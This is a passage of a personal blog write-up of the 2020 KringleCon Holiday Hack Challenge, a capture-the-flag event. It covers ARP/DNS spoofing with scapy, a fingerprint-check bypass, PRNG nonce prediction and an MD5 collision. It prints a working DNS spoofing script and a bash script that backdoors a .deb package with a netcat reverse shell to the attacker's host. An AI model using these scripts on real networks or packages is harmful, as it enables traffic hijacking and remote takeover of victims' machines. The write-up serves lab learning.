.... .... = Recursion desired: Do query recursively .... .... .0.. .... = Z: reserved (0) .... .... ...0 .... = Non-authenticated data: Unacceptable Questions: 1 Answer RRs: 2 Authority RRs: 0 Additional RRs: 0 Queries ftp.osuosl.org: type A, class IN Name: ftp.osuosl.org [Name Length: 14] [Label Count: 3] Type: A (Host Address) (1) Class: IN (0x0001) Answers ftp.osuosl.org: type A, class IN, addr 10.6.0.3 Name: ftp.osuosl.org Type: A (Host Address) (1) Class: IN (0x0001) Time to live: 0 (0 seconds) Data length: 4 Address: 10.6.0.3 ftp.osuosl.org: type A, class IN, addr 10.6.0.3 Name: ftp.osuosl.org Type: A (Host Address) (1) Class: IN (0x0001) Time to live: 0 (0 seconds) Data length: 4 Address: 10.6.0.3 [Retransmitted request. Original request in: 6] [Retransmission: True] Hah! I was responding with another query type packet, even though my response had answers! Derp. that helped me focus in on where to look (the transport was fine, the packet itself was not), which finally led me to the aa and qr fields! aa specifies that this is an authoritative answer (not necessarily required), but more importantly qr is a bitfield that specifies if this packet is a query (0), or a response (1). My completed script was therefore:\n#!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # creds: # https://thepacketgeek.com/scapy/building-network-tools/part-09/ # https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode()  i) \u0026 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.35\" us = ni.ifaddresses('eth0')[ni.AF_LINK][0]['addr'] them = \"4c:24:57🆎ed:84\" def handle_dns_request(packet): eth = Ether(src=us, dst=packet[Ether].src) # need to replace mac addresses ip = IP(dst=packet[IP].src, src=packet[IP].dst) # need to replace IP addresses udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) # need to replace ports dns = DNS( id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, ancount=2, an=DNSRR(rrname=packet[DNSQR].qname, rdata=ipaddr)/DNSRR(rrname=\"ftp.osuosl.org\",rdata=ipaddr) ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] \u0026 0x80 = 0\", # dns request ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request while True: sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() Great, so once we got the DNS answers to work fine, the next piece of the puzzle becomes clear using tcpdump again.\n16:53:34.977453 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 16:53:34.997602 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:03, length 28 16:53:35.029864 IP 10.6.6.35.50215  10.6.6.53.53: 0+ A? ftp.osuosl.org. (32) 16:53:35.062362 IP 10.6.6.53.53  10.6.6.35.50215: 0*- 2/0/0 A 10.6.0.3, A 10.6.0.3 (92) 16:53:35.067876 IP 10.6.0.3.52476  10.6.6.35.64352: Flags [S], seq 240645463, win 64240, options [mss 1460,sackOK,TS val 2437484659 ecr 0,nop,wscale 7], length 0 16:53:36.017388 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 [ ... ] 16:53:36.102610 IP 10.6.6.35.55554  10.6.0.3.80: Flags [S], seq 4003720740, win 64240, options [mss 1460,sackOK,TS val 1978770089 ecr 0,nop,wscale 7], length 0 16:53:36.102645 IP 10.6.0.3.80  10.6.6.35.55554: Flags [R.], seq 0, ack 4003720741, win 0, length 0 A connection for TCP port 80 (amongst others). The other, new, non-port 80 traffic was TLS, but I think that may have been an artefact of other processes running on the target host? I don’t know. Anyways, a port 80 connection implies a web request, so I fired up an http server using python, and re-ran the whole attack. This is where the DNS response script in a loop helped. I only had to run the ARP spoof manually.\n  arp shenanigans http request after the DNS poison   In our simple web server, we can see a request for /pub/jfrost/backdoor/suriv_amd64.deb.\nguest@a85cc3252902:~$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.6.6.35 - - [01/Jan/2021 16:59:38] code 404, message File not found 10.6.6.35 - - [01/Jan/2021 16:59:38] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - One of the hints on your badge would have helped with this part, which said:\n The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file.\n The article that was linked to pretty much clearly tells you what you need to do from here. Backdoor a .deb file (of which there were many in the debs/ folder). Since the target host we had was downloading one we could do the backdoor, rename it to what they were downloading and hope they would execute our shell.\nI won’t repeat what the article clearly states, but instead show the script I wrote to automate it given that it took a few tries to get right.\n#!/bin/bash  set -e DEB=\"netcat-traditional_1.10-41.1ubuntu1_amd64.deb\" TPATH=\"/tmp/packaging\" rm -Rf $TPATH mkdir $TPATH cd $TPATH cp ~/debs/$DEB . dpkg -x $DEB work ar -x $DEB tar xvf control.tar.xz ./control tar xvf control.tar.xz ./postinst mkdir work/DEBIAN mv ./control work/DEBIAN/control mv ./postinst work/DEBIAN/postinst US=$(ip a | grep inet | grep -v \"127.0.0.1\" | cut -d \" \" -f6 | cut -d \"/\" -f1) cat  work/DEBIAN/postinst nc $US 4444 -e /bin/bash \u0026 EOT dpkg-deb --build $TPATH/work/ This simply embedded a classic netcat reverse shell in the .deb file, which then served using the python HTTP server. One thing that cost me a lot of time was the fact that my fancy IP extraction one-liner was running ip -c, which enabled color output. This is great when you are the one that wants to read it, but not so much for computers. See the thing is that output resulted in an ANSI encoded string which when it got to the other side, meant that it broke the script and nothing happened. Yay :(\nAnyhoo, executing the full attack looked something like this:\n  arp shenanigans shell from 10.6.6.35   From here we could just cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt and find that Tanta Kringle recused herself.\n10 - defeat fingerprint sensor  Bypass the Santavator fingerprint sensor. Enter Santa’s office without Santa’s fingerprint.\n This challenge was the first time I started fiddling with how the Santavator was working under the hood.\n  santavator fingerprint reader   When activating the fingerprint reader as Santa, you are teleported straight to Santa’s Office. However, as your normal avatar, well, nothing happens when you click on it. So, the next logical thing was to pop open the browser console and get a feel for what drives the elevator.\n  santavator fingerprint reader javascript sources   I found some JavaScript in app.js, and read all of it. When I wanted to see what the current values were that were stored in variables, I’d switch to the console, select the elevator iframe and tinker away. One specific variable caught my attention after understanding the sourc a little better.\n  santavator fingerprint reader tokens   If you are playing as Santa though, that array looks a little different.\n[\"redlight\", \"workshop-button\", \"marble\", \"nut\", \"candycane\", \"elevator-key\", \"nut2\", \"ball\", \"yellowlight\", \"greenlight\", \"besanta\"] Notice the besanta entry there? So, to beat this one, change to your avatar, open up the browser console and add besanta to the tokens array with the below and click the fingerprint sensor:\ntokens.push('besanta') 11a - naughty/nice list with blockchain investigation part 1  Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)\n   blockchain challenge in santas office   Clicking on the naughty/nice list on the desk will take you to https://download.holidayhackchallenge.com/2020/blockchain.dat to download a file called blockchain.dat. Save this one. Next, the conversation with Tinsel Upatree will reveal a set of tools you could use to interact with that file, located here: https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip.\nThe “EducationPack” archive contains a simple Dockerfile to setup pycryptodome, as well as certificates that will allow you to interact with the blockchain data file you previously downloaded. As pycryptodome is a simple python dependency, I just installed it in a virtual environment and worked from there. Nothing stops you from building and using the docker container though.\nThe more important file though is naughty_nice.py. The beginning of the file contains a very large comment with a summary of how a blockchain works in general, together with some usage information about the two classes in the file; Block and Chain. The scripts’ entry point also has some example usage where a new Chain is created, and some blocks (including a genesis block) are added and finally verified.\nNow before we dive into the nonce prediction part of this objective, let’s get familiar with the two new classes we have to work with. I created a new file, main.py and imported the Block and Chain classes from the naughty_nice module. Next, I loaded the blockchain.dat file we got and tried to verify the chain using the verify_chain() function.\nimport hashlib from Crypto.PublicKey import RSA from naughty_nice import Chain with open('official_public.pem', 'rb') as fh: official_public_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print(f'chain verify: {c2.verify_chain(official_public_key)}') Running that resulted in:\n$ python3 main-blog.py *** WARNING *** Wrong previous hash at block 128449. *** WARNING *** Blockchain invalid from block 128449 onward. chain verify: False Closer inspection of the verify_chain() function reveals that it accepts a second argument to specify the hash for the previous block. Since we don’t have the full blockchain data that starts with the genesis block, we need to specify the hash we can find from the data we do have. So, I looped the blocks in the chain after loading and extracted the PreviousHash.\n# [ ... ] c2 = Chain(load=True, filename='blockchain.dat') print(f'chain verify: {c2.verify_chain(official_public_key)}') for block in c2.blocks: print(block) break The updated script would now print the full block (in an easy to read format thanks to the a __repr__() method on the Block class), where we could see the PreviousHash value.\n$ python3 main-blog.py *** WARNING *** Wrong previous hash at block 128449. *** WARNING *** Blockchain invalid from block 128449 onward. chain verify: False Chain Index: 128449 Nonce: e3e12de5edfb51e2 PID: 0803508ada0a5ebf [ ... ] Date: 03/24 Time: 13:21:00 PreviousHash: c6e2e6ecb785e7132c8003ab5aaba88d Data Hash to Sign: 03cfb11504b8eee93b26aeb0d8ac39ff Signature: b'PT4OZUq+vwfNDhqipxwt28NC4Hd7dw6N1i4XHMGkIMR53qy8dF47YwpqzEjW0EAbUYPZ+b/E4X3YjXUTI0VnoJ2VsJQWtIPwcGIk5ayMfe5dgrjuLle5NUyEpd1EpIPdiSLMnyvbJEzG3HfA2dpkNsXWtO/D5wFYWGEErAt/PyH9CK/QuV5w3ArCwEmM61KWV7XTmC38EQoIm9iz5QQIIBU2onlZUcBlZ81N+H8pL/utpArkLppSwdRdx5f2kHUTLM7I2egDAdHhQ5zPAbZLoJ03HYjEBGKXiSQjAGhqY47U2DmliyOEehchTmmq+JiBF3ozXiV5hm89y/mN2uUzmQ==' Knowing the PreviousHash value, we can call chain_verify() with the updated values.\n# [ ... ] c2 = Chain(load=True, filename='blockchain.dat') print(f'chain verify: {c2.verify_chain(official_public_key, \"c6e2e6ecb785e7132c8003ab5aaba88d\")}') This would result in the output stating chain verify: True. Great!\nAs far as nonce prediction goes, I first printed every single block as I did before, and used grep on that output to just get the Nonce value.\n$ python3 main-blog.py | grep Nonce | head Nonce: e3e12de5edfb51e2 Nonce: 2176088150fdfd1d Nonce: 0a2dada92f154da4 Nonce: d391517e345e0ffe Nonce: 8836422291566d65 Nonce: f4d0bb0198759e1d Nonce: 7640cd71f6ea6c76 Nonce: ec7a1a8ea7369d3b Nonce: 5fb94c5bbfb85869 Nonce: 27ac5576a7505af7 The snowball fight terminal challenge had us play with the Mersenne twister algorithm, and the sample code we used wanted integers to replicate the PRNG’s state. Looking at the Nonce values, they appeared to be hex, so I had a quick look at converting those to integers.\n$ python3 Python 3.8.7 (default, Dec 30 2020, 10:14:55) [Clang 12.0.0 (clang-1200.0.32.28)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.  0xe3e12de5edfb51e2 16420456181932970466  Easy! We also had a total of 1548 blocks in our chain, and therefore 1548 nonces which was more than enough to replicate the state of the PRNG. At this point I also realised I did not have to resort to silly shell parsing of the Nonce values as they were available in code when looping the blocks in the blockchain.\n# [ ... ] c2 = Chain(load=True, filename='blockchain.dat') # extract the nonce values from all the blocks in the chain nonce = [block.nonce for block in c2.blocks] print(nonce[:2]) This would print the first two nonce values extracted as (notice how they are already integers now!):\n$ python3 main-blog.py [16420456181932970466, 2411124002006105373] At this stage I naively thought I could just replicate what we had done in the snowball fight by replicating the PRNG’s state, and then continue to reveal the next values. The problem was though that when you did this, you would not get the correct nonce value! Remember, the question states (and you can easily verify) that the last block we have has the index 129996, and they want to know the nonce value for 130000. That’s just 4 predictions forward? Well, those values won’t be correct.\nMy first hypothesis was that because we are only feeding 624 numbers into the algorithm, our predictions should at least match the nonce value for the 625th block we have in the chain, right? No, even this was incorrect as it seemed like we could not even predict the 625th nonce correctly!\nRe-reading Tom’s original script from the terminal challenge, I realised that it was actually expecting 32bit numbers, and not 64bit ones like we are feeding to it at the moment. The biggest hint for that was this function in the mt19937 class.\ndef my_int32(self, x): return (x \u0026 0xFFFFFFFF) Because of this function, only part of our 64bit numbers were fed into the algorithm to determine state, meaning that our predictions won’t match. The question though was, how do you handle 64bit numbers? At this stage I could bore you with the countless Google’s I did and various articles I read. In the end, there were two things I saw that helped me realise what I had to do.\nUnfortunately, I can’t recall the source of the first hint, but I read an (article|code|blog|paper) that mentioned that the algorithm expects a DWORD, which is a 32bit unsigned integer, for each entry in the state array. That had me think I’d have to split the 64bit integer up into two 32bit integers. But, I had no idea if I had to feed both into the algorithm, or one, or if both, which one first? Anyways.\nThe second hint was reading code for an existing mersenne-twister-predictor project on Github to try and see if (and how) it handled 64bit values. I found the relevant code here, which had the setrandbits() function accept raw bits and an indication of how many bits.\n# source: https://github.com/kmyk/mersenne-twister-predictor/blob/25b5723c70e60398d2e8d6fdd51b887e343a97ae/mt19937predictor.py#L88-L101 def setrandbits(self, y, bits): '''The interface for :py:meth:`random.Random.getrandbits` in Python's Standard Library ''' if not (bits % 32 == 0): raise ValueError('number of bits must be a multiple of 32') if not (0  y  2 ** bits): raise ValueError('invalid state') if bits == 32: self.setrand_int32(y) else: while bits  0: self.setrand_int32(y \u0026 0xffffffff) y = 32 bits -= 32 Here we can see that 32bit values were being fed into the state array after being split up using some bitshift magic (and a hint of how many bits were expected). The state array feeding was also continuously done until there were no more bits left, meaning that the complete 64bit integer had to be squeezed in, in chunks of 32bit. That was enough to put me on the right path to solve this one!\nTo split up the 64bit number, you can literally just google something like “split 64-bit into two 32-bit” (ignoring the “how to convert 64bit apps to 32bit” lol). Regardless of the language the result is in, bitshift operations are usually pretty generic. The first hit for my suggested search was this post which showed the operations needed to both pack and unpack the 64bit integer. To get the lower number use number \u0026 0xffffffff, and to get the higher number use number  32.\nArmed with this knowledge I modified my nonce predictor script to loop over all of the 64bit nonces, split them up and populate a new 32bit nonce array. To know if the lower or higher number had to come first took some trial and error. Then I just followed the same loop like we did in the snowball fight game.\nnonce64 = [block.nonce for block in c2.blocks] nonce32 = [] for n in nonce64: l, h = n \u0026 0xffffffff, n  32 nonce32.append(l) nonce32.append(h) for i in range(mt19937.n): rng.MT[i] = untemper(nonce32[i]) I was almost there. The last bit needed was to extract a 64bit number again from the PRNG we have replicated the state of. Using the same mersenne-twister-predictor project, a getrandbits() function revealed that it would just keep on reading bits until the number of bits you wanted was reached. In other words, literally the inverse of the feeding process we followed. So, I created one more function to just get me a 64bit number by asking for two new numbers, and packing them into a 64bit integer.\ndef getnonce64(): a = rng.extract_number() b = rng.extract_number() return (b  32) | a Putting this all together resulted in me being able to correctly predict the 625th nonce like we had it in the blockchain. For the last block in the blockchain we know the nonce was eb806dad1ad54826, so to wrap this up I looped the number predictor until we reached that nonce (remember we had like 1500+ blocks), and then just stepped four more nonces to get to the answer. The final script I had was:\nfrom mt19937 import mt19937, untemper from naughty_nice import Chain match = 0xeb806dad1ad54826 rng = mt19937(0) c2 = Chain(load=True, filename='blockchain.dat') nonce64 = [block.nonce for block in c2.blocks] nonce32 = [] for n in nonce64: l, h = n \u0026 0xffffffff, n  32 nonce32.append(l) nonce32.append(h) for i in range(mt19937.n): rng.MT[i] = untemper(nonce32[i]) def getnonce64(): a = rng.extract_number() b = rng.extract_number() return (b  32) | a # ff to the latest value while getnonce64() != match: continue print(f'next nonce: {hex(getnonce64())}') print(f'next nonce: {hex(getnonce64())}') print(f'next nonce: {hex(getnonce64())}') print(f'next nonce: {hex(getnonce64())}') With this, the answer was: 57066318f32f729d\n11b - naughty/nice list with blockchain investigation part 2  The SHA256 of Jack’s altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you’re clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you’ve recreated the original block, what is the SHA256 of that block?\n This challenge was amazing. A lot of the hints you had from Elves and your badge made it clear that this blockchain was hashing using MD5 and they needed to change that. We’re given a sha265 of a block that had been altered, but since MD5 was in use we couldn’t just filter for that block. Instead, we had to rehash the blocks ourselves to identify the altered block. Watching the talk by Qwerty Petabyte (gosh, that voice was not fun to listen to), a slide showing the parts that are hashed was shown here. Specifically, everything, including the signature is hashed.\nIn the Block class, you’d find two functions that would return data from the block to be hashed; block_data() and block_data_signed(). The latter included the signature field, just like it was mentioned in the talk slide. So, to calculate the sha265 of every block, I imported hashlib and did that for the return value of block_data_signed(), matching that against the sha266 we were given.\nimport hashlib from naughty_nice import Chain c2 = Chain(load=True, filename='blockchain.dat') for block in c2.blocks: m = hashlib.sha256() m.update(block.block_data_signed()) if not (m.hexdigest() == \"58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f\"): continue print(block) print(f'MD5: {block.full_hash()}') This revealed the following block as the culprit. Notice just how nice this person was, and that it was the only block with two documents.\nChain Index: 129459 Nonce: a9447e5771c704f4 PID: 0000000000012fd1 RID: 000000000000020f Document Count: 2 Score: ffffffff (4294967295) Sign: 1 (Nice) Data item: 1 Data Type: ff (Binary blob) Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f046d3a7ff4e92dfe1def7407f2a7b73e1b759b8b919451e37518d22d987296fcb0f188dd60388bf20350f2a91c29d0348614dc0bceef2bcadd4cc3f251ba8f9fbaf171a06df1e1fd8649396ab86f9d5118cc8d8204b4ffe8d8f09' Data item: 2 Data Type: 05 (PDF) Data Length: 00009f57 [ ... laaaaaarge PDF Data section ... ] Date: 03/24 Time: 13:21:41 PreviousHash: 4a91947439046c2dbaa96db38e924665 Data Hash to Sign: 347979fece8d403e06f89f8633b5231a Signature: b'MJIxJy2iFXJRCN1EwDsqO9NzE2Dq1qlvZuFFlljmQ03+erFpqqgSI1xhfAwlfmI2MqZWXA9RDTVw3+aWPq2S0CKuKvXkDOrX92cPUz5wEMYNfuxrpOFhrK2sks0yeQWPsHFEV4cl6jtkZ//OwdIznTuVgfuA8UDcnqCpzSV9Uu8ugZpAlUY43Y40ecJPFoI/xi+VU4xM0+9vjY0EmQijOj5k89/AbMAD2R3UbFNmmR61w7cVLrDhx3XwTdY2RCc3ovnUYmhgPNnduKIUA/zKbuu95FFi5M2r6c5Mt6F+c9EdLza24xX2J4l3YbmagR/AEBaF9EBMDZ1o5cMTMCtHfw==' MD5: b10b4a6bd373b61f32f4fd3a0cdfbf84 The block had two documents that you could extract using block.dump_doc(1) and block.dump_doc(2). This would save the files to disk. I did not know what to do with the binary blob, but the PDF was interesting. I also saved the whole block we identified with:\nwith open('modified_block.dat', 'wb') as f: f.write(block.block_data_signed())   jack frost being suuuper nice it seems   Alright, it was clear from the hints that this challenge was some form of hash collision, so I worked though the contents of each of the suggested links:\n https://github.com/cr-marcstevens/hashclash https://github.com/corkami/collisions https://speakerdeck.com/ange/colltris  The slide deck was suuuper helpful (slide 101 to 111) to translate what was spoken about in the Github projects. I also found this talk by Ange Albertini really useful to colour in some of the gaps I had in the slide deck.\nIn the end, I realised we had a potential UNICOL collision, and the work I had to do was to identify the 4 specific bytes that were changed. From the provided material, I understood that the UNICOL collision relied on a similar prefix for the two files, preferably at a 64byte boundary (which could be padded if needed). I also understood that the file format matters even though we may be able to generate a hash collision. To help me better understand the block file format (and prepare for the byte changes needed), I loaded up the modified block in a hex editor and studied the Block.load_a_block() function closer.\ndef load_a_block(self, fh): self.index = int(fh.read(16), 16) self.nonce = int(fh.read(16), 16) self.pid = int(fh.read(16), 16) self.rid = int(fh.read(16), 16) self.doc_count = int(fh.read(1), 10) self.score = int(fh.read(8), 16) self.sign = int(fh.read(1), 10) count = self.doc_count while count  0: l_data = { 'type': int(fh.read(2), 16), 'length': int(fh.read(8), 16) } l_data['data'] = fh.read(l_data['length']) self.data.append(l_data) count -= 1 self.month = int(fh.read(2)) self.day = int(fh.read(2)) self.hour = int(fh.read(2)) self.minute = int(fh.read(2)) self.second = int(fh.read(2)) self.previous_hash = str(fh.read(32))[2:-1] self.hash = str(fh.read(32))[2:-1] self.sig = fh.read(344) return self Each property assignment came from reading a certain number of bytes of a raw block. For example, the index lived in the first 16 bytes of the block. Referencing a hex editor, we could confirm all of these. i.e. The hex value 0x1F9B3 which is the index matches the parsed value of 129459 when we re-hashed the blockchain to identify the modified block.\n  modified blockchain block snippet of the first 160 bytes, with the first 64 bytes highlighted using    I followed the load_a_block() function and marked the starting points of interesting fields so that I could navigate the file a little easier as well. This way I could easily identify metadata from data etc. Looking at the value for the score, we could see that this was a really, really high number. So, I thought this must be where one of the bytes had to change. I tried to manually fiddle with the bytes there and recalculate the MD5 hash, but to no avail.\nMy next step was to try out the hashclash proof of concept. I downloaded the binary release and navigated to the scripts/ directory. In here I made a new folder to work in, and copied out the first 64 bytes as a prefix to try.\n$ xxd prefix.dat 00000000: 3030 3030 3030 3030 3030 3031 6639 6233 000000000001f9b3 00000010: 6139 3434 3765 3537 3731 6337 3034 6634 a9447e5771c704f4 00000020: 3030 3030 3030 3030 3030 3031 3266 6431 0000000000012fd1 00000030: 3030 3030 3030 3030 3030 3030 3032 3066 000000000000020f Next, I ran the poc_no.sh script with my prefix, and waited :D\n  hashclash running on my chosen 64byte prefix   After not too long hashclash generated two files that had the same prefix, but had trailing bytes changed such that the MD5 of both files were the same! Incredible.\n  first hashclash MD5 collision found   From the radiff2 output we could see that the bytes we can fiddle with are at offsets 0x00000040 and 0x00000080. From slide 109 in the presentation, we also know that one byte typically goes up, and the other corresponding one goes down. Given that the block we’re working with has supposedly already been fiddled with, to get back to the original values we need to inverse those addition and subtraction operations, right? So, using the locations of the bytes identified by hashclash as reference, I did just that.\n  first reverted bytes in the modified block   That 0x31 became 0x30 and that 0xD6 became a 0xD7. The first changed byte actually changed the sign of the value, which explains why it was so high too! With these two bytes changed, checking the MD5 of the block, you’d find that it was still b10b4a6bd373b61f32f4fd3a0cdfbf84. 🚀\nThe next two bytes were a little harder to identify. I spent a bunch more time trying to manually find them, and for the longest time fixated on the  tag in the dump. Specifically, changing Pages 2 to things like Pages 3 or Pages 1. Unfortunately I just couldn’t get the MD5 sum to remain unchanged. Out of interest, I changed the same value in the raw PDF document (extracted from the block remember), and was met with this when opened:\n  jack frost being not so nice after all   Looks like Jack Frost managed to hide some complaints in that PDF. ha ha.\nTo find the other two bytes to modify, I resorted to using the hashclash poc again. I gradually increased the prefix used to one that was eventually 256 bytes long to find the next two bytes that had to be changed.\n$ xxd modified_block.256.dat 00000000: 3030 3030 3030 3030 3030 3031 6639 6233 000000000001f9b3 00000010: 6139 3434 3765 3537 3731 6337 3034 6634 a9447e5771c704f4 00000020: 3030 3030 3030 3030 3030 3031 3266 6431 0000000000012fd1 00000030: 3030 3030 3030 3030 3030 3030 3032 3066 000000000000020f 00000040: 3266 6666 6666 6666 6631 6666 3030 3030 2ffffffff1ff0000 00000050: 3030 3663 ea46 5340 303a 6079 d3df 2762 006c.FS@0:`y..'b 00000060: be68 467c 27f0 46d3 a7ff 4e92 dfe1 def7 .hF|'.F...N..... 00000070: 407f 2a7b 73e1 b759 b8b9 1945 1e37 518d @.*{s..Y...E.7Q. 00000080: 22d9 8729 6fcb 0f18 8dd6 0388 bf20 350f \"..)o........ 5. 00000090: 2a91 c29d 0348 614d c0bc eef2 bcad d4cc *....HaM........ 000000a0: 3f25 1ba8 f9fb af17 1a06 df1e 1fd8 6493 ?%............d. 000000b0: 96ab 86f9 d511 8cc8 d820 4b4f fe8d 8f09 ......... KO.... 000000c0: 3035 3030 3030 3966 3537 2550 4446 2d31 0500009f57%PDF-1 000000d0: 2e33 0a25 25c1 cec7 c521 0a0a 3120 3020 .3.%%....!..1 0 000000e0: 6f62 6a0a 3c3c 2f54 7970 652f 4361 7461 obj.  second hashclash MD5 collision found   Turns out I wasn’t too far off with that Pages value, but this helped confirm and identify the next two bytes to swap.\n  4 fixed bytes in the modified block   Doing that meant the MD5 sum was still the same, however, the sha256 sum was now fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb which was also the objectives answer.\n","wordCount":"15148","inLanguage":"en","datePublished":"2020-12-30T14:25:47+02:00","dateModified":"2020-12-30T14:25:47+02:00","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
the 2020 kinglecon 3 holiday hack challenge
</h1>
<div class=post-meta>December 30, 2020&nbsp;·&nbsp;72 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2020-12-30-kinglecon-holiday-hack-challenge-2020.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#foreword aria-label=foreword>foreword</a><ul>
<li>
<a href=#intro aria-label=intro>intro</a></li>
<li>
<a href=#format aria-label=format>format</a></li>
<li>
<a href=#terminals aria-label=terminals>terminals</a><ul>
<li>
<a href=#unescape-tmux aria-label="unescape tmux">unescape tmux</a></li>
<li>
<a href=#kringle-kiosk aria-label="kringle kiosk">kringle kiosk</a></li>
<li>
<a href=#linux-primer aria-label="linux primer">linux primer</a></li>
<li>
<a href=#speaker-unprep aria-label="speaker unprep">speaker unprep</a><ul>
<li>
<a href=#door aria-label=door>door</a></li>
<li>
<a href=#lights aria-label=lights>lights</a></li>
<li>
<a href=#vending-machine aria-label=vending-machine>vending-machine</a></li></ul>
</li>
<li>
<a href=#the-elf-code aria-label="the elf code">the elf code</a></li>
<li>
<a href=#336-kbps aria-label="33.6 kbps">33.6 kbps</a></li>
<li>
<a href=#redis-bug-hunt aria-label="redis bug hunt">redis bug hunt</a></li>
<li>
<a href=#scapy-prepper aria-label="scapy prepper">scapy prepper</a></li>
<li>
<a href=#can-bus-investigation aria-label="can-bus investigation">can-bus investigation</a></li>
<li>
<a href=#sort-o-matic aria-label=sort-o-matic>sort-o-matic</a></li>
<li>
<a href=#snowball-fight aria-label="snowball fight">snowball fight</a></li></ul>
</li>
<li>
<a href=#objectives aria-label=objectives>objectives</a><ul>
<li>
<a href=#1---uncover-santas-gift-list aria-label="1 - uncover santas gift list">1 - uncover santas gift list</a></li>
<li>
<a href=#2---investigate-s3-bucket aria-label="2 - investigate s3 bucket">2 - investigate s3 bucket</a></li>
<li>
<a href=#3---point-of-sale-password-recovery aria-label="3 - point-of-sale password recovery">3 - point-of-sale password recovery</a></li>
<li>
<a href=#4---operate-the-santavator aria-label="4 - operate the santavator">4 - operate the santavator</a></li>
<li>
<a href=#5---open-hid-lock aria-label="5 - open hid lock">5 - open hid lock</a></li>
<li>
<a href=#6---splunk-challenge aria-label="6 - splunk challenge">6 - splunk challenge</a></li>
<li>
<a href=#7---solve-the-sleighs-can-d-bus-problem aria-label="7 - solve the sleigh&amp;rsquo;s can-d-bus problem">7 - solve the sleigh&rsquo;s can-d-bus problem</a></li>
<li>
<a href=#8---broken-tag-generator aria-label="8 - broken tag generator">8 - broken tag generator</a></li>
<li>
<a href=#9---arp-shenanigans aria-label="9 - arp shenanigans">9 - arp shenanigans</a></li>
<li>
<a href=#10---defeat-fingerprint-sensor aria-label="10 - defeat fingerprint sensor">10 - defeat fingerprint sensor</a></li>
